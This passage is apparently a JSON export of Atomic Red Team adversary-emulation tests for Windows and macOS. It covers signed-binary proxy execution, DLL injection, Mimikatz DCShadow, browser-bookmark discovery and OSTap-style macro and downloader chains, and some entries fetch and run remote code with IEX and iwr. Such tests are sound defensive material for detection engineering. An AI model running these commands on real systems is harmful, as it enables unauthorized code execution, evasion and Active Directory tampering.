Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_chm_file | Remote .chm payload | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm | "}, "executionSteps": [{"description": "hh.exe #{remote_chm_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6h903h729mqh407hr1n", "clacwm1i4005u29mqcq4b332t"], "tags": []}, {"data": {"name": "Compiled HTML Help Local Payload", "shortName": "T1218.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses hh.exe to execute a local compiled HTML Help payload.\nUpon execution calc.exe will open\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | local_chm_file | Local .chm payload | Path | PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm | "}, "executionSteps": [{"description": "hh.exe #{local_chm_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6h903h729mqh407hr1n", "clacwm1i4005u29mqcq4b332t"], "tags": []}, {"data": {"name": "SyncAppvPublishingServer - Execute arbitrary PowerShell code", "shortName": "T1218", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe. Requires Windows 10.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | powershell_code | PowerShell code to execute | string | Start-Process calc.exe | "}, "executionSteps": [{"description": "SyncAppvPublishingServer.exe \"n; #{powershell_code}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm2fj00u529mqezim6o99"], "tags": []}, {"data": {"name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions", "shortName": "T1218", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | xml_payload | XML to execution | Path | PathToAtomicsFolder\\T1218\\src\\T1218.xml | \n | renamed_binary | renamed Microsoft.Workflow.Compiler | Path | PathToAtomicsFolder\\T1218\\src\\svchost.exe | \n | mwcpath | Default location of Microsoft.Workflow.Compiler.exe | Path | C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319 | \n | mwcname | Default name of microsoft.workflow.compiler.exe | Path | microsoft.workflow.compiler.exe | "}, "executionSteps": [{"description": "#{renamed_binary} #{xml_payload} output.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm61v030n29mqe1koczmr", "clacwm2fj00u529mqezim6o99"], "tags": []}, {"data": {"name": "Register-CimProvider - Execute evil dll", "shortName": "T1218", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dll_payload | DLL to execute | Path | PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll | "}, "executionSteps": [{"description": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}\n", "successCriteria": null}], "techniqueIds": ["clacwm61v030n29mqe1koczmr", "clacwm2fj00u529mqezim6o99"], "tags": []}, {"data": {"name": "ProtocolHandler.exe Downloaded a Suspicious File", "shortName": "T1218", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_url | url to document | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx | "}, "executionSteps": [{"description": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b\ncall \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|#{remote_url}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm61v030n29mqe1koczmr", "clacwm2fj00u529mqezim6o99"], "tags": []}, {"data": {"name": "Microsoft.Workflow.Compiler.exe Payload Execution", "shortName": "T1218", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | xml_payload | XML to execution | Path | PathToAtomicsFolder\\T1218\\src\\T1218.xml | \n | mwcpath | Default location of Microsoft.Workflow.Compiler.exe | Path | C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319 | \n | mwcname | Default name of microsoft.workflow.compiler.exe | Path | microsoft.workflow.compiler.exe | "}, "executionSteps": [{"description": "#{mwcpath}\\#{mwcname} \"#{xml_payload}\" output.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm61v030n29mqe1koczmr", "clacwm2fj00u529mqezim6o99"], "tags": []}, {"data": {"name": "mavinject - Inject DLL into running process", "shortName": "T1218", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | process_id | PID of process receiving injection | String | 1000 | \n | dll_payload | DLL to inject | Path | PathToAtomicsFolder\\T1218\\src\\x64\\T1218.dll | "}, "executionSteps": [{"description": "mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}\n", "successCriteria": null}], "techniqueIds": ["clacwm61v030n29mqe1koczmr", "clacwm2fj00u529mqezim6o99"], "tags": []}, {"data": {"name": "Lolbin Gpscript startup option", "shortName": "T1218", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes startup scripts configured in Group Policy\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Gpscript /startup\n", "successCriteria": null}], "techniqueIds": ["clacwm61v030n29mqe1koczmr"], "tags": []}, {"data": {"name": "Lolbin Gpscript logon option", "shortName": "T1218", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes logon scripts configured in Group Policy.\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Gpscript /logon\n", "successCriteria": null}], "techniqueIds": ["clacwm61v030n29mqe1koczmr"], "tags": []}, {"data": {"name": "Lolbas ie4uinit.exe use as proxy", "shortName": "T1218", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes commands from a specially prepared ie4uinit.inf file.\nPoc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nReference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | Path_inf | Path to the cab file | Path | PathToAtomicsFolder\\T1218\\src\\ieuinit.inf | \n | Path_ie4uinit | Path to ie4uinit.exe | Path | c:\\windows\\system32\\ie4uinit.exe | "}, "executionSteps": [{"description": "copy #{Path_ie4uinit} %TEMP%\\ie4uinit.exe\ncopy #{Path_inf} %TEMP%\\ieuinit.inf\n%TEMP%\\ie4uinit.exe -BaseSettings\n", "successCriteria": null}], "techniqueIds": ["clacwm61v030n29mqe1koczmr"], "tags": []}, {"data": {"name": "Load Arbitrary DLL via Wuauclt (Windows Update Client)", "shortName": "T1218", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | arbitrary_dll | Path of DLL to be loaded | String | PathToAtomicsFolder\\T1218\\bin\\calc.dll | "}, "executionSteps": [{"description": "wuauclt.exe /UpdateDeploymentProvider #{arbitrary_dll} /RunHandlerComServer\n", "successCriteria": null}], "techniqueIds": ["clacwm61v030n29mqe1koczmr"], "tags": []}, {"data": {"name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test", "shortName": "T1218", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | module_name | Specifies a temporary module name to use. If -ModuleName is not supplied, a 16-character random temporary module name is used. A PowerShell module can have any name. Because Get-VMRemoteFXPhysicalVideoAdapter abuses module load order, a module name must be specified. | String | foo | \n | module_path | Specifies an alternate, non-default PowerShell module path for RemoteFXvGPUDisablement.exe. If -ModulePath is not specified, the first entry in %PSModulePath% will be used. Typically, this is %USERPROFILE%\\Documents\\WindowsPowerShell\\Modules. | String | $PWD | "}, "executionSteps": [{"description": "Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}", "successCriteria": null}], "techniqueIds": ["clacwm61v030n29mqe1koczmr", "clacwm2fj00u529mqezim6o99"], "tags": []}, {"data": {"name": "InfDefaultInstall.exe .inf Execution", "shortName": "T1218", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | inf_to_execute | Local location of inf file | String | PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf | "}, "executionSteps": [{"description": "InfDefaultInstall.exe #{inf_to_execute}\n", "successCriteria": null}], "techniqueIds": ["clacwm61v030n29mqe1koczmr", "clacwm2fj00u529mqezim6o99"], "tags": []}, {"data": {"name": "DiskShadow Command Execution", "shortName": "T1218", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | txt_payload | txt to execute | Path | PathToAtomicsFolder\\T1218\\src\\T1218.txt | \n | dspath | Default location of DiskShadow.exe | Path | C:\\Windows\\System32\\diskshadow.exe | "}, "executionSteps": [{"description": "#{dspath} -S #{txt_payload} \n", "successCriteria": null}], "techniqueIds": ["clacwm61v030n29mqe1koczmr"], "tags": []}, {"data": {"name": "List Safari Bookmarks on MacOS", "shortName": "T1217", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test searches for Safari's Bookmarks file (on macOS) and lists any found instances to a text file.\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed. | Path | /tmp/T1217-Safari.txt | "}, "executionSteps": [{"description": "find / -path \"*/Safari/Bookmarks.plist\" 2>/dev/null >> #{output_file} \ncat #{output_file} \n", "successCriteria": null}], "techniqueIds": ["clacwm668034m29mq2wa9hh57"], "tags": []}, {"data": {"name": "List Mozilla Firefox bookmarks on Windows with command prompt", "shortName": "T1217", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Searches for Mozilla Firefox bookmarks file (on Windows distributions) that contains bookmarks in a SQLITE database.\nUpon execution, paths that contain bookmark files will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "where /R C:\\Users\\ places.sqlite\n", "successCriteria": null}], "techniqueIds": ["clacwm668034m29mq2wa9hh57", "clacwm1f3003v29mq7h3vdp9b"], "tags": []}, {"data": {"name": "List Mozilla Firefox Bookmark Database Files on macOS", "shortName": "T1217", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Searches for Mozilla Firefox's places.sqlite file (on macOS) that contains bookmarks and lists any found instances to a text file.\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed. | Path | /tmp/T1217_Firefox.txt | "}, "executionSteps": [{"description": "find / -path \"*/Firefox/Profiles/*/places.sqlite\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n", "successCriteria": null}], "techniqueIds": ["clacwm668034m29mq2wa9hh57", "clacwm1f3003v29mq7h3vdp9b"], "tags": []}, {"data": {"name": "List Mozilla Firefox Bookmark Database Files on Linux", "shortName": "T1217", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed. | Path | /tmp/T1217-Firefox.txt | "}, "executionSteps": [{"description": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n", "successCriteria": null}], "techniqueIds": ["clacwm668034m29mq2wa9hh57", "clacwm1f3003v29mq7h3vdp9b"], "tags": []}, {"data": {"name": "List Internet Explorer Bookmarks using the command prompt", "shortName": "T1217", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test will list the bookmarks for Internet Explorer that are found in the Favorites folder\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "dir /s /b %USERPROFILE%\\Favorites\n", "successCriteria": null}], "techniqueIds": ["clacwm668034m29mq2wa9hh57", "clacwm1f3003v29mq7h3vdp9b"], "tags": []}, {"data": {"name": "List Google Chrome Bookmarks on Windows with powershell", "shortName": "T1217", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Searches for Google Chromes's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm1f3003v29mq7h3vdp9b"], "tags": []}, {"data": {"name": "List Google Chrome Bookmark JSON Files on macOS", "shortName": "T1217", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Searches for Google Chrome's Bookmark file (on macOS) that contains bookmarks in JSON format and lists any found instances to a text file.\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed. | Path | /tmp/T1217-Chrome.txt | "}, "executionSteps": [{"description": "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n", "successCriteria": null}], "techniqueIds": ["clacwm668034m29mq2wa9hh57", "clacwm1f3003v29mq7h3vdp9b"], "tags": []}, {"data": {"name": "List Google Chrome / Opera Bookmarks on Windows with powershell", "shortName": "T1217", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm668034m29mq2wa9hh57"], "tags": []}, {"data": {"name": "List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt", "shortName": "T1217", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Searches for Google Chromes's and Edge Chromium's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "where /R C:\\Users\\ Bookmarks\n", "successCriteria": null}], "techniqueIds": ["clacwm668034m29mq2wa9hh57", "clacwm1f3003v29mq7h3vdp9b"], "tags": []}, {"data": {"name": "PubPrn.vbs Signed Script Bypass", "shortName": "T1216.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_payload | A remote payload to execute using PubPrn.vbs. | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct | "}, "executionSteps": [{"description": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:#{remote_payload}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5q302on29mqgg7p5zsr", "clacwm2aj00pp29mq89zb50ev"], "tags": []}, {"data": {"name": "SyncAppvPublishingServer Signed Script PowerShell Command Execution", "shortName": "T1216", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.\nUpon execution, calc.exe will be launched.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_to_execute | A PowerShell command to execute. | String | Start-Process calc | "}, "executionSteps": [{"description": "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;#{command_to_execute}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6ue03vi29mq0blochri", "clacwm2fm00u729mq0babavg0"], "tags": []}, {"data": {"name": "manage-bde.wsf Signed Script Command Execution", "shortName": "T1216", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the signed manage-bde.wsf script with options to execute an arbitrary command.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_to_execute | A command to execute. | Path | %windir%\\System32\\calc.exe | "}, "executionSteps": [{"description": "set comspec=#{command_to_execute}\ncscript %windir%\\System32\\manage-bde.wsf\n", "successCriteria": null}], "techniqueIds": ["clacwm6ue03vi29mq0blochri", "clacwm2fm00u729mq0babavg0"], "tags": []}, {"data": {"name": "DCShadow (Active Directory)", "shortName": "T1207", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | object | Targeted object (for machine account do not forget to add final '$') | String | bruce.wayne | \n | attribute | Object attribute to edit, interesting ones: badpwdcount, primaryGroupId, SIDHistory... | String | badpwdcount | \n | value | Value to assign to object attribute | String | 9999 | \n | mimikatz_path | Mimikatz windows executable | Path | $env:TEMP\\mimikatz\\x64\\mimikatz.exe | \n | psexec_path | Path to PsExec | Path | C:\\PSTools\\PsExec.exe | "}, "executionSteps": [{"description": "# starting fake DC server, as SYSTEM (required)\n$dc_output_file = \"$env:TEMP\\art-T1207-mimikatz-DC.log\"\nRemove-Item $dc_output_file -ErrorAction Ignore\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\" `\"exit`\"\"\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam\"\n\n# wait for fake DC server to be ready...\nStart-Sleep -Seconds 5\n\n# server ready, so trigger replication (push) and wait until it finished\n& #{mimikatz_path} \"lsadump::dcshadow /push\" \"exit\"\n\nWrite-Host \"`nWaiting for fake DC server to return\"\nWait-Process $dc\n\nWrite-Host \"`nOutput from fake DC server:\"\nGet-Content $dc_output_file\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\nRemove-Item $dc_output_file -ErrorAction Ignore\n\nWrite-Host \"End of DCShadow\"\n", "successCriteria": null}], "techniqueIds": ["clacwm64w033g29mqerdsa2pv"], "tags": []}, {"data": {"name": "DCShadow - Mimikatz", "shortName": "T1207", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use Mimikatz DCShadow method to simulate behavior of a Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | object | Targeted object (for machine account do not forget to add final '$') | string | bruce.wayne | \n | attribute | Object attribute to edit, interesting ones: badpwdcount, primaryGroupId, SIDHistory... | string | badpwdcount | \n | value | Value to assign to object attribute | string | 9999 | \n | mimikatz_path | Mimikatz windows executable | path | $env:TEMP\\mimikatz\\x64\\mimikatz.exe | \n | psexec_path | Path to PsExec | string | C:\\PSTools\\PsExec.exe | "}, "executionSteps": [{"description": "# starting fake DC server, as SYSTEM (required)\n$dc_output_file = \"$env:TEMP\\art-T1207-mimikatz-DC.log\"\nRemove-Item $dc_output_file -ErrorAction Ignore\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\" `\"exit`\"\"\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam\"\n\n# wait for fake DC server to be ready...\nStart-Sleep -Seconds 5\n\n# server ready, so trigger replication (push) and wait until it finished\n& #{mimikatz_path} \"lsadump::dcshadow /push\" \"exit\"\n\nWrite-Host \"`nWaiting for fake DC server to return\"\nWait-Process $dc\n\nWrite-Host \"`nOutput from fake DC server:\"\nGet-Content $dc_output_file\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\nRemove-Item $dc_output_file -ErrorAction Ignore\n\nWrite-Host \"End of DCShadow\"\n", "successCriteria": null}], "techniqueIds": ["clacwm2cd00rb29mq4ys799o4"], "tags": []}, {"data": {"name": "Potentially Unwanted Applications (PUA)", "shortName": "T1204.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The Potentially Unwanted Applications (PUA) protection feature in antivirus software can identify and block PUAs from downloading and installing on endpoints in your network. These applications are not considered viruses, malware, or other types of threats, but might perform actions on endpoints that adversely affect their performance or use. This file is similar to EICAR test virus file, but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | pua_url | url to PotentiallyUnwanted.exe | Url | http://amtso.eicar.org/PotentiallyUnwanted.exe | \n | pua_file | path to PotentiallyUnwanted.exe | Path | $env:TEMP/PotentiallyUnwanted.exe | "}, "executionSteps": [{"description": "Invoke-WebRequest #{pua_url} -OutFile #{pua_file}\n& \"#{pua_file}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5uy02tz29mqhmf0gz2x"], "tags": []}, {"data": {"name": "OSTap Style Macro Execution", "shortName": "T1204.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | jse_path | Path for the macro to write out the \"malicious\" .jse file\n | String | C:\\Users\\Public\\art.jse | \n | ms_product | Maldoc application Word or Excel | String | Word | "}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5uy02tz29mqhmf0gz2x", "clacwm23100jo29mq0kimakgc"], "tags": []}, {"data": {"name": "OSTap Payload Download", "shortName": "T1204.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses cscript //E:jscript to download a file\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | script_file | File to execute jscript code from | Path | %TEMP%\\OSTapGet.js | \n | file_url | URL to retrieve file from | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt | "}, "executionSteps": [{"description": "echo var url = \"#{file_url}\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\ncscript //E:Jscript #{script_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5uy02tz29mqhmf0gz2x", "clacwm23100jo29mq0kimakgc"], "tags": []}, {"data": {"name": "OSTAP JS version", "shortName": "T1204.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | jse_path | jse file to execute with wscript | Path | C:\\Users\\Public\\art.jse | \n | ms_product | Maldoc application Word or Excel | String | Word | "}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "successCriteria": null}], 